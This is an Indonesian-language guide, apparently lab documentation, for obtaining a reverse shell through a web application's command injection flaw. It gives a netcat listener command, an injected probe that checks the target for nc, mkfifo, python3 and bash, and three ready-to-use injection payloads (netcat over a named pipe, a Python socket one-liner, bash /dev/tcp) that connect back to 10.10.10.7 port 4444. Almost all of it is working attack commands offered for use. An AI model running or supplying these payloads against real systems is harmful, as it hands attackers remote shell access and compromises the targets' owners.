# Panduan Reverse Shell via Command Injection

Dokumentasi langkah-langkah melakukan koneksi balik (*reverse shell*) memanfaatkan kerentanan Command Injection di lingkungan laboratorium.

---

## 1. Menyiapkan Listener (Attacker Machine)

Sebelum mengirimkan payload di aplikasi web target, jalankan penangkap koneksi (*listener*) di terminal lokal:

```bash
nc -lvnp 4444
Keterangan Flag:

-l : Mode listening (menunggu koneksi masuk).

-v : Verbose (menampilkan detail koneksi).

-n : Tanpa resolusi DNS (menggunakan IP langsung).

-p 4444 : Port yang dibuka untuk listener.

2. Memeriksa Ketersediaan Tools di Target
Gunakan perintah berikut di kolom input aplikasi target untuk mengecek dependensi sistem target:

Plaintext
127.0.0.1 ; for cmd in nc mkfifo python3 bash ; do echo "$cmd: $(which $cmd 2>&1)" ; done
Jika path seperti /usr/bin/nc atau /usr/bin/python3 muncul, artinya tools tersebut dapat digunakan.

Pilih payload di bawah ini yang paling sesuai dengan hasil pengecekan tools di target.

3. Opsi Payload Reverse Shell
Opsi A: Netcat via Named Pipe (FIFO)
Digunakan jika nc terpasang di target tetapi tidak mendukung flag -e.

Plaintext
127.0.0.1 ; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.7 4444 >/tmp/f
Opsi B: Python 3
Digunakan jika sistem target memiliki interpreter Python 3.

Plaintext
127.0.0.1 ; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.7",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
Opsi C: Bash Direct (/dev/tcp)
Digunakan jika sistem target mendukung pemrosesan socket bawaan Bash.

Plaintext
127.0.0.1 ; bash -c 'bash -i >& /dev/tcp/10.10.10.7/4444 0>&1'
Catatan: Sesuaikan IP 10.10.10.7 dengan IP komputer penangkap Anda, dan port 4444 sesuai port listener yang dibuka.
